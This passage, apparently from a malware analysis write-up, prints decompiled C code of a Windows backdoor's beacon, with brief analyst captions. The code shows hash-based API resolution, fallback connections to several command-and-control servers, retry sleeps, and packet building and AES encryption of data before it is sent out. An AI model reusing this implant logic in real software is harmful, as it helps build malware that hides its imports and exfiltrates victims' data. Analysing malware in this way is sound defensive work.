                          kernel32_GetProcessHeap_8 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                          v115 = kernel32_GetProcessHeap_8();
                          kernel32_HeapFree_4 = FindModuleByHash(0xBB9549C0);
                          ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_4)(v115, 0, v113);
                        }
                      }
                      else
                      {
                        send_data_0(a1, 12u, *(_QWORD *)(a1 + 40), 168u);
                      }
                    }
                    else
                    {
                      v130[0] = 6;
                      LOBYTE(v103) = 11;
                      v104 = prepare_c2_packet(v103, (int)v130, 1u, &v135);
                      v105 = v104;
                      if ( v104 )
                      {
                        send_data(*(__int64 ***)(a1 + 72), v104, v135);
                        kernel32_GetProcessHeap_9 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                        v107 = kernel32_GetProcessHeap_9();
                        kernel32_HeapFree_5 = FindModuleByHash(0xBB9549C0);
                        ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_5)(v107, 0, v105);
                      }
                    }
                    break;
                }
              }
            }
            strcpy(v148, "send  failed");
            kernel32_OutputDebugStringA_1 = FindModuleByHash(449530704);
            ((void (__fastcall *)(char *))kernel32_OutputDebugStringA_1)(v148);
            v14 = *(_QWORD *)(a1 + 72);
            if ( v14 )
            {
              kernel32_GetProcessHeap_10 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
              v16 = kernel32_GetProcessHeap_10();
              kernel32_HeapFree_6 = FindModuleByHash(0xBB9549C0);
              ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_6)(v16, 0, v14);
            }
            kernel32_Sleep_1 = FindModuleByHash(102426073);
            ((void (__fastcall *)(__int64))kernel32_Sleep_1)(120000);
            v19 = *(_QWORD *)(a1 + 88);
            ws2_32_closesocket_2 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
            ws2_32_closesocket_2(v19);
          }
          else
          {
            v6 = *(_QWORD *)(a1 + 88);
            ws2_32_closesocket_3 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
            ws2_32_closesocket_3(v6);
LABEL_99:
            kernel32_Sleep_2 = FindModuleByHash(102426073);
            ((void (__fastcall *)(__int64))kernel32_Sleep_2)(120000);
          }
        }
LABEL_101:
        v125 = ***(_QWORD ***)(a1 + 72);
        ws2_32_closesocket_4 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
        ws2_32_closesocket_4(v125);
        sub_7FF88D681E70(a1 + 48);
        if ( *(_BYTE *)(*(_QWORD *)(a1 + 40) + 27LL) )
        {
          v127 = *(_QWORD *)(a1 + 16);
          kernel32_CloseHandle_1 = FindModuleByHash(1292304930);
          ((void (__fastcall *)(__int64))kernel32_CloseHandle_1)(v127);
        }
      }
    }
  }
}
```
- child function in beacon to check connection to c2
```bash
__int64 __fastcall check_conection_to_server(__int64 a1)
{
  __int64 (__fastcall *ws2_32_socket)(__int64, __int64, __int64); // rax
  __int64 v3; // rax
  __int64 v4; // rcx
  __int64 v5; // rbx
  void (__fastcall *ws2_32_closesocket)(__int64); // rax
  __int64 (__fastcall *ws2_32_socket_1)(__int64, __int64, __int64); // rax
  __int64 v8; // rax
  __int64 v9; // rcx
  __int64 v10; // rbx
  void (__fastcall *ws2_32_closesocket_1)(__int64); // rax
  __int64 (__fastcall *ws2_32_socket_2)(__int64, __int64, __int64); // rax
  __int64 v13; // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  void (__fastcall *msvcrt_memset)(_BYTE *, _QWORD, __int64); // rax
  __int64 v17; // rcx
  void (__fastcall *user32_wsprintfA)(_BYTE *, char *, __int64, _QWORD); // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA_1; // rax
  __int64 v20; // rcx
  char v21[8]; // [rsp+20h] [rbp-E0h] BYREF
  char v22[24]; // [rsp+28h] [rbp-D8h] BYREF
  _BYTE v23[272]; // [rsp+40h] [rbp-C0h] BYREF

  ws2_32_socket = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
  v3 = ws2_32_socket(2, 1, 6);
  *(_QWORD *)(a1 + 88) = v3;
  if ( v3 == -1 )
    return 0;
  if ( (unsigned int)get_hostname_to_ip(v4, *(_QWORD *)(a1 + 40) + 48LL) != 1
    || (unsigned int)connect_to_server(
                       a1,
                       *(_QWORD *)(a1 + 40) + 48LL,
                       *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 36LL)) != 1 )
  {
    v5 = *(_QWORD *)(a1 + 88);
    ws2_32_closesocket = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
    ws2_32_closesocket(v5);
    ws2_32_socket_1 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
    v8 = ws2_32_socket_1(2, 1, 6);
    *(_QWORD *)(a1 + 88) = v8;
    if ( v8 == -1 )
      return 0;
    if ( (unsigned int)get_hostname_to_ip(v9, *(_QWORD *)(a1 + 40) + 88LL) != 1
      || (unsigned int)connect_to_server(
                         a1,
                         *(_QWORD *)(a1 + 40) + 88LL,
                         *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 38LL)) != 1 )
    {
      v10 = *(_QWORD *)(a1 + 88);
      ws2_32_closesocket_1 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
      ws2_32_closesocket_1(v10);
      ws2_32_socket_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D681850(340917865);
      v13 = ws2_32_socket_2(2, 1, 6);
      *(_QWORD *)(a1 + 88) = v13;
      if ( v13 == -1 )
      {
        strcpy(v22, "Socket failed");
        kernel32_OutputDebugStringA = FindModuleByHash(449530704);
        ((void (__fastcall *)(char *))kernel32_OutputDebugStringA)(v22);
        return 0;
      }
      msvcrt_memset = (void (__fastcall *)(_BYTE *, _QWORD, __int64))sub_7FF88D6812D0(94614379);
      msvcrt_memset(v23, 0, 260);
      strcpy(v21, "%s:%d");
      user32_wsprintfA = (void (__fastcall *)(_BYTE *, char *, __int64, _QWORD))sub_7FF88D681160(v17);
      user32_wsprintfA(v23, v21, *(_QWORD *)(a1 + 40) + 128LL, *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 6LL));
      kernel32_OutputDebugStringA_1 = FindModuleByHash(449530704);
      ((void (__fastcall *)(_BYTE *))kernel32_OutputDebugStringA_1)(v23);
      if ( (unsigned int)get_hostname_to_ip(v20, *(_QWORD *)(a1 + 40) + 128LL) != 1
        || (unsigned int)connect_to_server(
                           a1,
                           *(_QWORD *)(a1 + 40) + 128LL,
                           *(unsigned __int16 *)(*(_QWORD *)(a1 + 40) + 6LL)) != 1 )
      {
        return 0;
      }
    }
  }
  return 1;
}
```
```bash
__int64 __fastcall get_hostname_to_ip(__int64 a1, __int64 a2)
{
  __int64 (__fastcall *ws2_32_gethostbyname)(__int64); // rax
  __int64 v4; // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  __int64 v7; // rbx
  void (__fastcall *msvcrt_memcpy)(int *, __int64, __int64); // rax
  void (__fastcall *msvcrt_memset)(__int64, _QWORD, __int64); // rax
  __int64 (__fastcall *ws2_32_inet_ntoa)(_QWORD); // rax
  __int64 v11; // rbx
  struct _LIST_ENTRY *kernel32_lstrlenA; // rax
  int v13; // eax
  __int64 v14; // rdi
  __int64 (__fastcall *ws2_32_inet_ntoa_1)(_QWORD); // rax
  __int64 v16; // rbx
  void (__fastcall *msvcrt_memcpy_1)(__int64, __int64, __int64); // rax
  int v18; // [rsp+20h] [rbp-28h] BYREF
  char v19[16]; // [rsp+28h] [rbp-20h] BYREF

  ws2_32_gethostbyname = (__int64 (__fastcall *)(__int64))sub_7FF88D681850(0xC3DE085A);
  v4 = ws2_32_gethostbyname(a2);
  if ( v4 )
  {
    v7 = **(_QWORD **)(v4 + 24);
    msvcrt_memcpy = (void (__fastcall *)(int *, __int64, __int64))sub_7FF88D6812D0(0x5A370CB);
    msvcrt_memcpy(&v18, v7, 4);
    msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D6812D0(0x5A3B36B);
    msvcrt_memset(a2, 0, 40);
    LODWORD(v7) = v18;
    ws2_32_inet_ntoa = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(0xBF9998E1);
    v11 = ws2_32_inet_ntoa((unsigned int)v7);
    kernel32_lstrlenA = FindModuleByHash(1460756741);
    v13 = ((__int64 (__fastcall *)(__int64))kernel32_lstrlenA)(v11);
    LODWORD(v11) = v18;
    v14 = v13;
    ws2_32_inet_ntoa_1 = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(0xBF9998E1);
    v16 = ws2_32_inet_ntoa_1((unsigned int)v11);
    msvcrt_memcpy_1 = (void (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6812D0(94597323);
    msvcrt_memcpy_1(a2, v16, v14);
    return 1;
  }
  else
  {
    strcpy(v19, "Gethos failed");
    kernel32_OutputDebugStringA = FindModuleByHash(449530704);
    ((void (__fastcall *)(char *))kernel32_OutputDebugStringA)(v19);
    return 0;
  }
}
```
```bash
__int64 __fastcall connect_to_server(__int64 socket_handle, __int64 c2_ip, unsigned int c2_port)
{
  __int64 (__fastcall *ws2_32_htons)(_QWORD); // rax
  unsigned int (__fastcall *ws2_32_inet_addr)(__int64); // rax
  void (__fastcall *msvcrt_memset)(_BYTE *, _QWORD, __int64); // rax
  void (__fastcall *v9)(_BYTE *, char *, __int64, _QWORD, _QWORD, _QWORD); // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  __int64 v11; // rbx
  unsigned int (__fastcall *ws2_32_connect)(__int64, _BYTE *, __int64); // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA_1; // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA_2; // rax
  _BYTE v16[12]; // [rsp+20h] [rbp-E0h] BYREF
  char v17[8]; // [rsp+30h] [rbp-D0h] BYREF
  char v18[16]; // [rsp+38h] [rbp-C8h] BYREF
  char v19[24]; // [rsp+48h] [rbp-B8h] BYREF
  _BYTE v20[272]; // [rsp+60h] [rbp-A0h] BYREF

  *(_WORD *)v16 = 2;
  ws2_32_htons = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(127629100);
  *(_WORD *)&v16[2] = ws2_32_htons((unsigned __int16)c2_port);
  ws2_32_inet_addr = (unsigned int (__fastcall *)(__int64))sub_7FF88D681850(0xBF92328A);
  *(_QWORD *)&v16[4] = ws2_32_inet_addr(c2_ip);
  msvcrt_memset = (void (__fastcall *)(_BYTE *, _QWORD, __int64))sub_7FF88D6812D0(94614379);
  msvcrt_memset(v20, 0, 260);
  strcpy(v17, "%s:%d");
  v9 = (void (__fastcall *)(_BYTE *, char *, __int64, _QWORD, _QWORD, _QWORD))sub_7FF88D681160();
  v9(v20, v17, c2_ip, c2_port, *(_QWORD *)v16, *(unsigned int *)&v16[8]);
  kernel32_OutputDebugStringA = FindModuleByHash(449530704);
  ((void (__fastcall *)(_BYTE *))kernel32_OutputDebugStringA)(v20);
  v11 = *(_QWORD *)(socket_handle + 88);
  strcpy(v18, "Tcp failed");
  strcpy(v19, "Tcp succeed");
  ws2_32_connect = (unsigned int (__fastcall *)(__int64, _BYTE *, __int64))sub_7FF88D681850(0xCFB6B06A);
  if ( ws2_32_connect(v11, v16, 16) == -1 )
  {
    kernel32_OutputDebugStringA_1 = FindModuleByHash(449530704);
    ((void (__fastcall *)(char *))kernel32_OutputDebugStringA_1)(v18);
    return 0;
  }
  else
  {
    kernel32_OutputDebugStringA_2 = FindModuleByHash(449530704);
    ((void (__fastcall *)(char *))kernel32_OutputDebugStringA_2)(v19);
    return 1;
  }
}
```
- function to create hash for header and encrypt packet before send
```bash
__int64 __fastcall init_crypto(__int64 a1)
{
  __int64 v2; // rbx
  void (__fastcall *msvcrt_memset)(__int64, _QWORD, __int64); // rax
  unsigned int (__fastcall *cryptsp_CryptAcquireContextA)(__int64 *, _QWORD, _QWORD, __int64, _DWORD); // rax
  unsigned int v5; // ebp
  void (__fastcall *cryptsp_CryptAcquireContextA_1)(__int64 *, _QWORD, _QWORD, __int64, int); // rax
  __int64 v7; // rsi
  __int64 v8; // rbx
  unsigned int (__fastcall *cryptsp_CryptCreateHash)(__int64, __int64, _QWORD, _QWORD, __int64 *); // rax
  __int64 v10; // rbx
  unsigned int (__fastcall *cryptsp_CryptHashData)(__int64, __int64, __int64, _QWORD); // rax
  __int64 v12; // rbx
  void (__fastcall *cryptsp_CryptGetHashParam)(__int64, __int64, _BYTE *, int *, _DWORD); // rax
  __int64 v14; // rbx
  void (__fastcall *msvcrt_memcpy)(__int64, _BYTE *, __int64); // rax
  __int64 v16; // rcx
  __int64 v17; // rax
  __int64 v18; // r14
  int v19; // edi
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v21; // rbx
  struct _LIST_ENTRY *kernel32_HeapFree; // rax
  __int64 v23; // rbx
  void (__fastcall *cryptsp_CryptDestroyHash)(__int64); // rax
  __int64 v25; // rbx
  void (__fastcall *cryptsp_CryptReleaseContext)(__int64, _QWORD); // rax
  int v28; // [rsp+30h] [rbp-48h] BYREF
  __int64 v29; // [rsp+38h] [rbp-40h] BYREF
  __int64 v30; // [rsp+40h] [rbp-38h] BYREF
  _BYTE v31[16]; // [rsp+48h] [rbp-30h] BYREF

  v2 = *(_QWORD *)(a1 + 80);
  msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D6812D0(94614379);
  msvcrt_memset(v2, 0, 16);
  v30 = 0;
  v29 = 0;
  cryptsp_CryptAcquireContextA = (unsigned int (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, _DWORD))sub_7FF88D681430(0xFA197AC2);
  v5 = 1;
  if ( !cryptsp_CryptAcquireContextA(&v29, 0, 0, 1, 0) )
  {
    cryptsp_CryptAcquireContextA_1 = (void (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, int))sub_7FF88D681430(-98993470);
    cryptsp_CryptAcquireContextA_1(&v29, 0, 0, 1, 8);
  }
  v7 = *(_QWORD *)(a1 + 80);
  v28 = 16;
  v8 = v29;
  cryptsp_CryptCreateHash = (unsigned int (__fastcall *)(__int64, __int64, _QWORD, _QWORD, __int64 *))sub_7FF88D681430(-544380918);
  if ( cryptsp_CryptCreateHash(v8, 32771, 0, 0, &v30) )
  {
    v10 = v30;
    cryptsp_CryptHashData = (unsigned int (__fastcall *)(__int64, __int64, __int64, _QWORD))sub_7FF88D681430(-651526288);
    if ( cryptsp_CryptHashData(v10, v7, 632, 0) )
    {
      v12 = v30;
      cryptsp_CryptGetHashParam = (void (__fastcall *)(__int64, __int64, _BYTE *, int *, _DWORD))sub_7FF88D681430(-917791321);
      cryptsp_CryptGetHashParam(v12, 2, v31, &v28, 0);
    }
  }
  v14 = *(_QWORD *)(a1 + 80);
  msvcrt_memcpy = (void (__fastcall *)(__int64, _BYTE *, __int64))sub_7FF88D6812D0(94597323);
  msvcrt_memcpy(v14, v31, 16);
  LOBYTE(v16) = 2;
  v17 = prepare_c2_packet(v16, *(_QWORD *)(a1 + 80), 632u, &v28);
  v18 = v17;
  if ( !v17
    || (v19 = send_data(*(__int64 ***)(a1 + 72), v17, v28),
        kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(0xB9F2133D),
        v21 = kernel32_GetProcessHeap(),
        kernel32_HeapFree = FindModuleByHash(0xBB9549C0),
        ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree)(v21, 0, v18),
        v19 != v28) )
  {
    v5 = 0;
  }
  v23 = v30;
  if ( v30 )
  {
    cryptsp_CryptDestroyHash = (void (__fastcall *)(__int64))sub_7FF88D681430(0x8A8687E0);
    cryptsp_CryptDestroyHash(v23);
    v30 = 0;
  }
  v25 = v29;
  if ( v29 )
  {
    cryptsp_CryptReleaseContext = (void (__fastcall *)(__int64, _QWORD))sub_7FF88D681430(-582920680);
    cryptsp_CryptReleaseContext(v25, 0);
  }
  return v5;
}
```
```bash
__int64 __fastcall prepare_c2_packet(
        unsigned __int8 command_flag,
        int timestamp,
        unsigned int exfiltrate_data,
        int *a4)
{
  __int64 v5; // rbp
  int v7; // ebx
  struct _LIST_ENTRY *kernel32_QueryPerformanceCounter; // rax
  _BYTE *v9; // rbx
  __int64 v10; // rdi
  void (__fastcall *msvcrt_memcpy)(_BYTE *, _DWORD *, __int64); // rax
  __int64 (*kernel32_GetProcessHeap_1)(void); // rax
  __int64 v13; // rbx
  __int64 (__fastcall *v14)(__int64, __int64, __int64); // rax
  __int64 v15; // rdi
  __int64 (*kernel32_GetProcessHeap_2)(void); // rax
  __int64 v17; // rbx
  struct _LIST_ENTRY *kernel32_HeapFree; // rax
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v21; // rbx
  __int64 (__fastcall *v22)(__int64, __int64, __int64); // rax
  void (__fastcall *msvcrt_memcpy_1)(__int64, int *, __int64); // rax
  int v24; // [rsp+30h] [rbp-58h] BYREF
  int v25; // [rsp+38h] [rbp-50h] BYREF
  _DWORD v26[2]; // [rsp+3Ch] [rbp-4Ch] BYREF
  int v27; // [rsp+44h] [rbp-44h]
  _BYTE v28[16]; // [rsp+48h] [rbp-40h] BYREF

  v5 = exfiltrate_data;
  v7 = command_flag;
  kernel32_QueryPerformanceCounter = FindModuleByHash(0xA9FE4DA8);
  ((void (__fastcall *)(int *))kernel32_QueryPerformanceCounter)(&v24);
  v25 = 938760145;
  v26[1] = v7;
  v26[0] = v24;
  if ( !(_DWORD)v5 )
  {
    v27 = 0;
    *a4 = 16;
    kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
    v21 = kernel32_GetProcessHeap();
    v22 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
    v15 = v22(v21, 8, 16);
    goto LABEL_10;
  }
  v9 = v28;
  v10 = 4;
  do
  {
    msvcrt_memcpy = (void (__fastcall *)(_BYTE *, _DWORD *, __int64))sub_7FF88D6812D0(94597323);
    msvcrt_memcpy(v9, v26, 4);
    v9 += 4;
    --v10;
  }
  while ( v10 );
  kernel32_GetProcessHeap_1 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
  v13 = kernel32_GetProcessHeap_1();
  v14 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v15 = v14(v13, 8, v5 + 116);
  *a4 = v5 + 100;
  if ( (unsigned int)sub_7FF88D681B10(1, (unsigned int)v28, timestamp, v5, v15 + 16, (__int64)a4) )
  {
    v27 = *a4;
    *a4 = v27 + 16;
LABEL_10:
    msvcrt_memcpy_1 = (void (__fastcall *)(__int64, int *, __int64))sub_7FF88D6812D0(94597323);
    msvcrt_memcpy_1(v15, &v25, 16);
    return v15;
  }
  if ( v15 )
  {
    kernel32_GetProcessHeap_2 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
    v17 = kernel32_GetProcessHeap_2();
    kernel32_HeapFree = FindModuleByHash(0xBB9549C0);
    ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree)(v17, 0, v15);
  }
  return 0;
}
```
```bash
__int64 __fastcall sub_7FF88D681B10(int a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, unsigned int *a6)
{
  unsigned int (__fastcall *cryptsp_CryptAcquireContextA)(__int64 *, _QWORD, _QWORD, __int64, _DWORD); // rax
  void (__fastcall *cryptsp_CryptAcquireContextA_1)(__int64 *, _QWORD, _QWORD, __int64, int); // rax
  void (__fastcall *msvcrt_memcpy)(_BYTE *, __int64, __int64); // rax
  __int64 v12; // rbx
  unsigned int (__fastcall *cryptsp_CryptImportKey)(__int64, _DWORD *, __int64); // rax
  __int64 v14; // rbx
  void (__fastcall *cryptsp_CryptReleaseContext)(__int64, _QWORD); // rax
  void (__fastcall *msvcrt_memset)(__int64, __int64, _QWORD); // rax
  __int64 v18; // rdi
  __int64 (__fastcall *cryptsp_CryptEncrypt)(__int64, _QWORD, __int64); // rax
  unsigned int v20; // eax
  __int64 v21; // rbx
  __int64 (__fastcall *cryptsp_CryptDecrypt)(__int64, _QWORD, __int64); // rax
  unsigned int v23; // edi
  __int64 v24; // rbx
  void (__fastcall *cryptsp_CryptDestroyKey)(__int64); // rax
  __int64 v26; // rbx
  void (__fastcall *cryptsp_CryptReleaseContext_1)(__int64, _QWORD); // rax
  __int64 v29; // [rsp+48h] [rbp-38h] BYREF
  __int64 v30; // [rsp+50h] [rbp-30h]
  _DWORD v31[3]; // [rsp+58h] [rbp-28h] BYREF
  _BYTE v32[20]; // [rsp+64h] [rbp-1Ch] BYREF

  v30 = 0;
  v29 = 0;
  cryptsp_CryptAcquireContextA = (unsigned int (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, _DWORD))sub_7FF88D681430(0xFA197AC2);
  if ( !cryptsp_CryptAcquireContextA(&v29, 0, 0, 24, 0) )
  {
    cryptsp_CryptAcquireContextA_1 = (void (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, int))sub_7FF88D681430(0xFA197AC2);
    cryptsp_CryptAcquireContextA_1(&v29, 0, 0, 24, -268435456);
  }
  if ( !v29 )
    return 0;
  v31[1] = 26126;
  v31[0] = 520;
  v31[2] = 16;
  msvcrt_memcpy = (void (__fastcall *)(_BYTE *, __int64, __int64))sub_7FF88D6812D0(94597323);
  msvcrt_memcpy(v32, a2, 16);
  v12 = v29;
  cryptsp_CryptImportKey = (unsigned int (__fastcall *)(__int64, _DWORD *, __int64))sub_7FF88D681430(0xB2BC6416);
  if ( !cryptsp_CryptImportKey(v12, v31, 28) )
  {
    v14 = v29;
    cryptsp_CryptReleaseContext = (void (__fastcall *)(__int64, _QWORD))sub_7FF88D681430(0xDD415618);
    cryptsp_CryptReleaseContext(v14, 0);
    return 0;
  }
  msvcrt_memset = (void (__fastcall *)(__int64, __int64, _QWORD))sub_7FF88D6812D0(94597323);
  msvcrt_memset(a5, a3, a4);
  if ( a1 )
  {
    v18 = v30;
    cryptsp_CryptEncrypt = (__int64 (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D681430(0xE7888A37);
    v20 = cryptsp_CryptEncrypt(v18, 0, 1);
  }
  else
  {
    v21 = v30;
    cryptsp_CryptDecrypt = (__int64 (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D681430(0x858FDFCD);
    v20 = cryptsp_CryptDecrypt(v21, 0, 1);
  }
  v23 = v20;
  if ( v20 )
    *a6 = a4;
  v24 = v30;
  cryptsp_CryptDestroyKey = (void (__fastcall *)(__int64))sub_7FF88D681430(0x979785C5);
  cryptsp_CryptDestroyKey(v24);
  v26 = v29;
  cryptsp_CryptReleaseContext_1 = (void (__fastcall *)(__int64, _QWORD))sub_7FF88D681430(0xDD415618);
  cryptsp_CryptReleaseContext_1(v26, 0);
  return v23;
}
```
